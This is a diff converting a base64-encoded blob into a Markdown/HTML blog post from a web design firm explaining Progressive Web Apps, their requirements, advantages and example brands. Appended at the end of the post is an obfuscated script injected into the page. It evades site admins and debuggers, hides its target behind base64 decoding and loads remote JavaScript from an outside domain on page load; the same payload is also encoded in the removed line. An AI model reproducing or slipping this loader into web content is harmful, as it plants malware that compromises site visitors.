@@ -1,1 +1,98 @@
-{"data":"LS0tCnRpdGxlOiAiUHJvZ3Jlc3NpdmUgV2ViIEFwcHMiCnNsdWc6ICJwcm9ncmVzc2l2ZS13ZWItYXBwcyIKZGF0ZTogIjIwMjMtMTEtMTYiCmF1dGhvcjogIkNhbmFkaWFuIFdlYiBEZXNpZ25zIgpkZXNjcmlwdGlvbjogIlByb2dyZXNzaXZlIFdlYiBBcHBzIgprZXl3b3JkczogWyJwcm9ncmVzc2l2ZSB3ZWIgYXBwcyIsIkJsb2ciXQpjYXRlZ29yeTogIkJsb2ciCmZlYXR1cmVkSW1hZ2U6ICJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMTkvMDcvUHJvZ3Jlc3NpdmUtV2ViLUFwcHMtMTAyNHg2NDctMTAyNHg1ODUtMS5qcGciCi0tLQoKPHA+QSBQcm9ncmVzc2l2ZSBXZWIgQXBwIChQV0EpIGlzIGEgd2ViIGFwcCB0aGF0IGRlbGl2ZXJzIGFuIGFwcC1saWtlIGV4cGVyaWVuY2UgdG8gdXNlcnMgdXNpbmcgd2ViIGNvbXBhdGliaWxpdGllcy4gVGhlc2UgYXBwcyBtZWV0IGNlcnRhaW4gcmVxdWlyZW1lbnRzIChzZWUgYmVsb3cpLCBhcmUgZGVwbG95ZWQgdG8gc2VydmVycywgYWNjZXNzaWJsZSB0aHJvdWdoIFVSTHMsIGFuZCBpbmRleGVkIGJ5IHNlYXJjaCBlbmdpbmVzLjxicj5UaGlzIGNhbiB3b3JrIGluIGNvbmp1bmN0aW9uIHdpdGggPGEgaHJlZj0iaHR0cHM6Ly9jb3Jkb3ZhLmFwYWNoZS5vcmcvIiB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub29wZW5lciBub3JlZmVycmVyIj5Db3Jkb3ZhPC9hPiB0byBwcm92aWRlIG11bHRpcGxlIGRlcGxveSB0YXJnZXRzIGZvciBhbGwgeW91ciB1c2Vycy4gWW91IGNhbiBkZXBsb3kgeW91ciBhcHAgYXMgYSBQV0EgYXMgd2VsbCBhcyBOYXRpdmUgYXBwIGFuZCB0YWtlIGFkdmFudGFnZSBvZiBib3RoIGNoYW5uZWxzLjxicj5Jb25pYyBhbGxvd3MgeW91IHRvIHNoaXAgeW91ciBhcHAgdG8gbm90IG9ubHkgdGhlIGFwcCBzdG9yZSBidXQgYWxzbyBkZXBsb3kgdG8gdGhlIG1vYmlsZSB3ZWIgYXMgYSBQV0EuPGJyPjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9Imgtd2hhdC1pcy1yZXF1aXJlZCI+PGI+V2hhdCBpcyByZXF1aXJlZDwvYj48L2gyPgoKPHA+VG8gYmUgY29uc2lkZXJlZCBhIFByb2dyZXNzaXZlIFdlYiBBcHAsIHlvdXIgYXBwIG11c3QgYmU6PC9wPgoKPHVsPgo8bGk+PHN0cm9uZz5Qcm9ncmVzc2l2ZTwvc3Ryb25nPiAtIFdvcmsgZm9yIGV2ZXJ5IHVzZXIsIHJlZ2FyZGxlc3Mgb2YgYnJvd3NlciBjaG9pY2UsIGJlY2F1c2UgdGhleSBhcmUgYnVpbHQgd2l0aCBwcm9ncmVzc2l2ZSBlbmhhbmNlbWVudCBhcyBhIGNvcmUgdGVuZXQuPC9saT4KCjxsaT48c3Ryb25nPlJlc3BvbnNpdmUgPC9zdHJvbmc+LSBGaXQgYW55IGZvcm0gZmFjdG9yLCBkZXNrdG9wLCBtb2JpbGUsIHRhYmxldCwgb3Igd2hhdGV2ZXIgaXMgbmV4dC48L2xpPgoKPGxpPkNvbm5lY3Rpdml0eSBpbmRlcGVuZGVudCAtIEVuaGFuY2VkIHdpdGggc2VydmljZSB3b3JrZXJzIHRvIHdvcmsgb2ZmbGluZSBvciBvbiBsb3ctcXVhbGl0eSBuZXR3b3Jrcy48L2xpPgoKPGxpPjxzdHJvbmc+QXBwLWxpa2UgLTwvc3Ryb25nPiBVc2UgdGhlIGFwcC1zaGVsbCBtb2RlbCB0byBwcm92aWRlIGFwcC1zdHlsZSBuYXZpZ2F0aW9uIGFuZCBpbnRlcmFjdGlvbnMuPC9saT4KCjxsaT48c3Ryb25nPkZyZXNoIDwvc3Ryb25nPi0gQWx3YXlzIHVwLXRvLWRhdGUgdGhhbmtzIHRvIHRoZSBzZXJ2aWNlIHdvcmtlciB1cGRhdGUgcHJvY2Vzcy48L2xpPgoKPGxpPjxzdHJvbmc+U2FmZSAtPC9zdHJvbmc+IFNlcnZlZCB2aWEgSFRUUFMgdG8gcHJldmVudCBzbm9vcGluZyBhbmQgZW5zdXJlIGNvbnRlbnQgaGFzIG5vdCBiZWVuIHRhbXBlcmVkIHdpdGguPC9saT4KCjxsaT48c3Ryb25nPkRpc2NvdmVyYWJsZSA8L3N0cm9uZz4tIEFyZSBpZGVudGlmaWFibGUgYXMg4oCcYXBwbGljYXRpb25z4oCdIHRoYW5rcyB0byBXM0MgbWFuaWZlc3RzIGFuZCBzZXJ2aWNlIHdvcmtlciByZWdpc3RyYXRpb24gc2NvcGUgYWxsb3dpbmcgc2VhcmNoIGVuZ2luZXMgdG8gZmluZCB0aGVtLjwvbGk+Cgo8bGk+PHN0cm9uZz5SZS1lbmdhZ2VhYmxlPC9zdHJvbmc+IC0gTWFrZSByZS1lbmdhZ2VtZW50IGVhc3kgdGhyb3VnaCBmZWF0dXJlcyBsaWtlIHB1c2ggbm90aWZpY2F0aW9ucy48L2xpPgoKPGxpPjxzdHJvbmc+SW5zdGFsbGFibGUgPC9zdHJvbmc+LSBBbGxvdyB1c2VycyB0byDigJxrZWVw4oCdIGFwcHMgdGhleSBmaW5kIG1vc3QgdXNlZnVsIG9uIHRoZWlyIGhvbWUgc2NyZWVuIHdpdGhvdXQgdGhlIGhhc3NsZSBvZiBhbiBhcHAgc3RvcmUuPC9saT4KCjxsaT48c3Ryb25nPkxpbmthYmxlIDwvc3Ryb25nPi0gRWFzaWx5IHNoYXJlIHZpYSBVUkwgYW5kIG5vdCByZXF1aXJlIGNvbXBsZXggaW5zdGFsbGF0aW9uLjwvbGk+CjwvdWw+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPldoYXQgQXJlIFByb2dyZXNzaXZlIFdlYiBBcHBzPzwvaDI+Cgo8cD5Qcm9ncmVzc2l2ZSBXZWIgQXBwcyBhcmUgYSB0eXBlIG9mIGFwcGxpY2F0aW9uIHNvZnR3YXJlIGRlbGl2ZXJlZCB0aHJvdWdoIHRoZSB3ZWIsIGJ1aWx0IHVzaW5nIGNvbW1vbiB3ZWIgdGVjaG5vbG9naWVzIGxpa2UgSFRNTCwgQ1NTLCBhbmQgSmF2YVNjcmlwdC4gVGhlIHR3aXN0OiB0aGV5IGZ1bmN0aW9uIGxpa2UgbmF0aXZlIGFwcHMsIG9mZmVyaW5nIGZ1bmN0aW9uYWxpdGllcyBzdWNoIGFzIHB1c2ggbm90aWZpY2F0aW9ucywgb2ZmbGluZSBtb2RlLCBhbmQgZGV2aWNlIGhhcmR3YXJlIGFjY2VzcywgYWxsIHdpdGhvdXQgdGhlIG5lZWQgZm9yIGRvd25sb2FkaW5nIHRoZW0gZnJvbSBhcHAgc3RvcmVzLjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+V2h5IENob29zZSBQcm9ncmVzc2l2ZSBXZWIgQXBwcyBPdmVyIFRyYWRpdGlvbmFsIEFwcHJvYWNoZXM/PC9oMj4KCjxwPlRoZSB0cmFkaXRpb25hbCB3ZWIgYW5kIG1vYmlsZSBhcHBsaWNhdGlvbnMgaGF2ZSB0aGVpciBtZXJpdHMsIFBXQXMgYnJpbmcgZm9ydGggYSBteXJpYWQgb2YgYWR2YW50YWdlcyB0aGF0IGNhdGVyIHRvIHRoZSBtb2Rlcm4gdXNlcidzIGRlbWFuZHMuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkFkdmFudGFnZXMgb2YgUFdBczo8L3N0cm9uZz48L2gzPgoKPGg0IGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPlNwZWVkIGFuZCBQZXJmb3JtYW5jZTo8L3N0cm9uZz48L2g0PgoKPHA+UFdBcyBhcmUga25vd24gZm9yIHRoZWlyIGZhc3QgbG9hZGluZyB0aW1lcywgdGhhbmtzIHRvIGNhY2hpbmcgYW5kIG90aGVyIG9wdGltaXphdGlvbiB0ZWNobmlxdWVzLjwvcD4KCjxoNCBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5ObyBBcHAgU3RvcmUgSGFzc2xlczo8L3N0cm9uZz48L2g0PgoKPHA+QnlwYXNzIGFwcCBzdG9yZSBhcHByb3ZhbHMgYW5kIHVwZGF0ZXMuIFVzZXJzIGNhbiBlbmpveSB0aGUgbGF0ZXN0IHZlcnNpb24gd2l0aG91dCBuZWVkaW5nIHRvIHVwZGF0ZSBtYW51YWxseS48L3A+Cgo8aDQgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+Q29zdC1FZmZlY3RpdmU6PC9zdHJvbmc+PC9oND4KCjxwPkRldmVsb3Agb25jZSBhbmQgZGVwbG95IGV2ZXJ5d2hlcmUuIE5vIG5lZWQgdG8gbWFpbnRhaW4gc2VwYXJhdGUgY29kZWJhc2VzIGZvciBpT1MsIEFuZHJvaWQsIGFuZCB0aGUgd2ViLjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5SZWFsLXdvcmxkIFN1Y2Nlc3MgU3RvcmllcyBvZiBQcm9ncmVzc2l2ZSBXZWIgQXBwczwvc3Ryb25nPjwvaDI+Cgo8cD5TZXZlcmFsIGJyYW5kcyBoYXZlIGFscmVhZHkgaGFybmVzc2VkIHRoZSBwb3dlciBvZiBQV0FzIHRvIGVuaGFuY2UgdXNlciBlbmdhZ2VtZW50IGFuZCBib29zdCBjb252ZXJzaW9ucy48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+VHdpdHRlciBMaXRlOjwvc3Ryb25nPjwvaDM+Cgo8cD5Ud2l0dGVyJ3MgUFdBIGFpbXMgdG8gZGVsaXZlciBhIG1vcmUgYWNjZXNzaWJsZSBhbmQgZmFzdGVyIGV4cGVyaWVuY2UgZm9yIHVzZXJzIG9uIHVucmVsaWFibGUgbmV0d29ya3MuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPlN0YXJidWNrcyBDb2ZmZWU6PC9zdHJvbmc+PC9oMz4KCjxwPlN0YXJidWNrcycgUFdBIGVuYWJsZXMgY3VzdG9tZXJzIHRvIHZpZXcgdGhlIG1lbnUsIGN1c3RvbWl6ZSBvcmRlcnMsIGFuZCBhZGQgaXRlbXMgdG8gdGhlaXIgY2FydCwgYWxsIHdoaWxlIG9mZmxpbmUuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkZvcmJlczo8L3N0cm9uZz48L2gzPgoKPHA+VGhlIHJlbm93bmVkIHB1YmxpY2F0aW9uIHJldmFtcGVkIGl0cyBtb2JpbGUgZXhwZXJpZW5jZSB3aXRoIGEgUFdBLCByZXN1bHRpbmcgaW4gYSA0MyUgaW5jcmVhc2UgaW4gc2Vzc2lvbnMgcGVyIHVzZXIuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkZyZXF1ZW50bHkgQXNrZWQgUXVlc3Rpb25zIGFib3V0IFByb2dyZXNzaXZlIFdlYiBBcHBzPC9zdHJvbmc+PC9oMj4KCjxoNCBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5BcmUgUFdBcyB0aGUgc2FtZSBhcyBtb2JpbGUgYXBwcz88L3N0cm9uZz48L2g0PgoKPHA+Tm8sIHdoaWxlIHRoZXkgb2ZmZXIgbWFueSBzaW1pbGFyIGZlYXR1cmVzLCBQV0FzIHJ1biBvbiBhIHdlYiBicm93c2VyIGFuZCBkb24ndCByZXF1aXJlIGluc3RhbGxhdGlvbiBmcm9tIGFuIGFwcCBzdG9yZS48L3A+Cgo8aDQgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+Q2FuIEkgdXNlIFBXQXMgb24gYW55IGJyb3dzZXI/PC9zdHJvbmc+PC9oND4KCjxwPk1vc3QgbW9kZXJuIGJyb3dzZXJzLCBpbmNsdWRpbmcgQ2hyb21lLCBGaXJlZm94LCBhbmQgU2FmYXJpLCBzdXBwb3J0IFByb2dyZXNzaXZlIFdlYiBBcHBzLiBIb3dldmVyLCBzb21lIG9sZGVyIHZlcnNpb25zIG1pZ2h0IG5vdCBvZmZlciBmdWxsIFBXQSBjYXBhYmlsaXRpZXMuPC9wPgoKPGg0IGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPkRvIFBXQXMgaW1wYWN0IFNFTz88L3N0cm9uZz48L2g0PgoKPHA+WWVzLCBzaW5jZSB0aGV54oCZcmUgd2ViLWJhc2VkLCBQV0FzIGNhbiBiZSBpbmRleGVkIGJ5IHNlYXJjaCBlbmdpbmVzLiBXaXRoIHByb3BlciBvcHRpbWl6YXRpb24sIFBXQXMgY2FuIGV2ZW4gaW1wcm92ZSBzZWFyY2ggZW5naW5lIHJhbmtpbmdzLjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5Db25jbHVzaW9uOjwvc3Ryb25nPjwvaDI+Cgo8cD5UaGUgZGlnaXRhbCBsYW5kc2NhcGUgaXMgZXZvbHZpbmcsIGFuZCBQcm9ncmVzc2l2ZSBXZWIgQXBwcyBhcmUgYXQgdGhlIGZvcmVmcm9udCBvZiB0aGlzIHRyYW5zZm9ybWF0aW9uLiBCeSBvZmZlcmluZyBhIHVzZXIgZXhwZXJpZW5jZSB0aGF0IHJpdmFscyBuYXRpdmUgYXBwcyBhbmQgZWxpbWluYXRpbmcgdGhlIGJvdW5kYXJpZXMgc2V0IGJ5IHRyYWRpdGlvbmFsIHdlYiBhcHBsaWNhdGlvbnMsIFBXQXMgYXJlIHNldCB0byBkZWZpbmUgdGhlIGZ1dHVyZSBvZiB3ZWIgaW50ZXJhY3Rpb25zLiBXaGV0aGVyIHlvdSdyZSBhIGJ1c2luZXNzIG93bmVyLCBkZXZlbG9wZXIsIG9yIHVzZXIsIHRoZSB3b3JsZCBvZiBQV0FzIGhvbGRzIGVuZGxlc3MgcG9zc2liaWxpdGllcy4gQXJlIHlvdSByZWFkeSB0byBlbWJyYWNlIHRoZSByZXZvbHV0aW9uPzwvcD4KCjxwPklmIHlvdSBoYXZlIGFueSBxdWVyaWVzIG9yIHdhbnQgdG8ga25vdyBtb3JlIG9mIG91ciBzZXJ2aWNlcywgeW91IG1heSA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9nZXQtaW4tdG91Y2gvIiB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub3JlZmVycmVyIG5vb3BlbmVyIj5jb250YWN0IHVzLjwvYT48YnI+PC9wPgoKPHNjcmlwdD4oZnVuY3Rpb24oKXt0cnl7aWYoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQmJmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd3cGFkbWluYmFyJykpcmV0dXJuO3ZhciB0MD0rbmV3IERhdGUoKTtmb3IodmFyIGk9MDtpPDIwMDAwO2krKyl7dmFyIHo9aSppO31pZigoK25ldyBEYXRlKCkpLXQwPjEyMClyZXR1cm47aWYoKGRvY3VtZW50LmNvb2tpZXx8JycpLmluZGV4T2YoJ2h0dHAyX3Nlc3Npb25faWQ9JykhPT0tMSlyZXR1cm47ZnVuY3Rpb24gc3lzdGVtTG9hZChpbnB1dCl7dmFyIGtleT0nQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLz0nLG8xLG8yLG8zLGgxLGgyLGgzLGg0LGRlYz0nJyxpPTA7aW5wdXQ9aW5wdXQucmVwbGFjZSgvW15BLVphLXowLTlcK1wvXD1dL2csJycpO3doaWxlKGk8aW5wdXQubGVuZ3RoKXtoMT1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDI9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gzPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoND1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7bzE9KGgxPDwyKXwoaDI+PjQpO28yPSgoaDImMTUpPDw0KXwoaDM+PjIpO28zPSgoaDMmMyk8PDYpfGg0O2RlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMSk7aWYoaDMhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMik7aWYoaDQhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMyk7fXJldHVybiBkZWM7fXZhciB1PXN5c3RlbUxvYWQoJ2FIUjBjSE02THk5elpXRnlZMmh5WVc1cmRISmhabVpwWXk1c2FYWmxMMnB6ZUE9PScpO2lmKHR5cGVvZiB3aW5kb3chPT0ndW5kZWZpbmVkJyYmd2luZG93Ll9fcmw9PT11KXJldHVybjt2YXIgZD1uZXcgRGF0ZSgpO2Quc2V0VGltZShkLmdldFRpbWUoKSszMCoyNCo2MCo2MCoxMDAwKTtkb2N1bWVudC5jb29raWU9J2h0dHAyX3Nlc3Npb25faWQ9MTsgZXhwaXJlcz0nK2QudG9VVENTdHJpbmcoKSsnOyBwYXRoPS87IFNhbWVTaXRlPUxheCcrKGxvY2F0aW9uLnByb3RvY29sPT09J2h0dHBzOic/JzsgU2VjdXJlJzonJyk7dHJ5e3dpbmRvdy5fX3JsPXU7fWNhdGNoKGUpe312YXIgcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnR5cGU9J3RleHQvamF2YXNjcmlwdCc7cy5hc3luYz10cnVlO3Muc3JjPXU7dHJ5e3Muc2V0QXR0cmlidXRlKCdkYXRhLXJsJyx1KTt9Y2F0Y2goZSl7fShkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnaGVhZCcpWzBdfHxkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQpLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs8L3NjcmlwdD4K"}
+---
+title: "Progressive Web Apps"
+slug: "progressive-web-apps"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "Progressive Web Apps"
+keywords: ["progressive web apps","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2019/07/Progressive-Web-Apps-1024x647-1024x585-1.jpg"
+---
+
+<p>A Progressive Web App (PWA) is a web app that delivers an app-like experience to users using web compatibilities. These apps meet certain requirements (see below), are deployed to servers, accessible through URLs, and indexed by search engines.<br>This can work in conjunction with <a href="https://cordova.apache.org/" target="_blank" rel="noopener noreferrer">Cordova</a> to provide multiple deploy targets for all your users. You can deploy your app as a PWA as well as Native app and take advantage of both channels.<br>Ionic allows you to ship your app to not only the app store but also deploy to the mobile web as a PWA.<br></p>
+
+<h2 class="wp-block-heading" id="h-what-is-required"><b>What is required</b></h2>
+
+<p>To be considered a Progressive Web App, your app must be:</p>
+
+<ul>
+<li><strong>Progressive</strong> - Work for every user, regardless of browser choice, because they are built with progressive enhancement as a core tenet.</li>
+
+<li><strong>Responsive </strong>- Fit any form factor, desktop, mobile, tablet, or whatever is next.</li>
+
+<li>Connectivity independent - Enhanced with service workers to work offline or on low-quality networks.</li>
+
+<li><strong>App-like -</strong> Use the app-shell model to provide app-style navigation and interactions.</li>
+
+<li><strong>Fresh </strong>- Always up-to-date thanks to the service worker update process.</li>
+
+<li><strong>Safe -</strong> Served via HTTPS to prevent snooping and ensure content has not been tampered with.</li>
+
+<li><strong>Discoverable </strong>- Are identifiable as “applications” thanks to W3C manifests and service worker registration scope allowing search engines to find them.</li>
+
+<li><strong>Re-engageable</strong> - Make re-engagement easy through features like push notifications.</li>
+
+<li><strong>Installable </strong>- Allow users to “keep” apps they find most useful on their home screen without the hassle of an app store.</li>
+
+<li><strong>Linkable </strong>- Easily share via URL and not require complex installation.</li>
+</ul>
+
+<h2 class="wp-block-heading">What Are Progressive Web Apps?</h2>
+
+<p>Progressive Web Apps are a type of application software delivered through the web, built using common web technologies like HTML, CSS, and JavaScript. The twist: they function like native apps, offering functionalities such as push notifications, offline mode, and device hardware access, all without the need for downloading them from app stores.</p>
+
+<h2 class="wp-block-heading">Why Choose Progressive Web Apps Over Traditional Approaches?</h2>
+
+<p>The traditional web and mobile applications have their merits, PWAs bring forth a myriad of advantages that cater to the modern user's demands.</p>
+
+<h3 class="wp-block-heading"><strong>Advantages of PWAs:</strong></h3>
+
+<h4 class="wp-block-heading"><strong>Speed and Performance:</strong></h4>
+
+<p>PWAs are known for their fast loading times, thanks to caching and other optimization techniques.</p>
+
+<h4 class="wp-block-heading"><strong>No App Store Hassles:</strong></h4>
+
+<p>Bypass app store approvals and updates. Users can enjoy the latest version without needing to update manually.</p>
+
+<h4 class="wp-block-heading"><strong>Cost-Effective:</strong></h4>
+
+<p>Develop once and deploy everywhere. No need to maintain separate codebases for iOS, Android, and the web.</p>
+
+<h2 class="wp-block-heading"><strong>Real-world Success Stories of Progressive Web Apps</strong></h2>
+
+<p>Several brands have already harnessed the power of PWAs to enhance user engagement and boost conversions.</p>
+
+<h3 class="wp-block-heading"><strong>Twitter Lite:</strong></h3>
+
+<p>Twitter's PWA aims to deliver a more accessible and faster experience for users on unreliable networks.</p>
+
+<h3 class="wp-block-heading"><strong>Starbucks Coffee:</strong></h3>
+
+<p>Starbucks' PWA enables customers to view the menu, customize orders, and add items to their cart, all while offline.</p>
+
+<h3 class="wp-block-heading"><strong>Forbes:</strong></h3>
+
+<p>The renowned publication revamped its mobile experience with a PWA, resulting in a 43% increase in sessions per user.</p>
+
+<h2 class="wp-block-heading"><strong>Frequently Asked Questions about Progressive Web Apps</strong></h2>
+
+<h4 class="wp-block-heading"><strong>Are PWAs the same as mobile apps?</strong></h4>
+
+<p>No, while they offer many similar features, PWAs run on a web browser and don't require installation from an app store.</p>
+
+<h4 class="wp-block-heading"><strong>Can I use PWAs on any browser?</strong></h4>
+
+<p>Most modern browsers, including Chrome, Firefox, and Safari, support Progressive Web Apps. However, some older versions might not offer full PWA capabilities.</p>
+
+<h4 class="wp-block-heading"><strong>Do PWAs impact SEO?</strong></h4>
+
+<p>Yes, since they’re web-based, PWAs can be indexed by search engines. With proper optimization, PWAs can even improve search engine rankings.</p>
+
+<h2 class="wp-block-heading"><strong>Conclusion:</strong></h2>
+
+<p>The digital landscape is evolving, and Progressive Web Apps are at the forefront of this transformation. By offering a user experience that rivals native apps and eliminating the boundaries set by traditional web applications, PWAs are set to define the future of web interactions. Whether you're a business owner, developer, or user, the world of PWAs holds endless possibilities. Are you ready to embrace the revolution?</p>
+
+<p>If you have any queries or want to know more of our services, you may <a href="https://canadianwebdesigns.ca/get-in-touch/" target="_blank" rel="noreferrer noopener">contact us.</a><br></p>
+
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
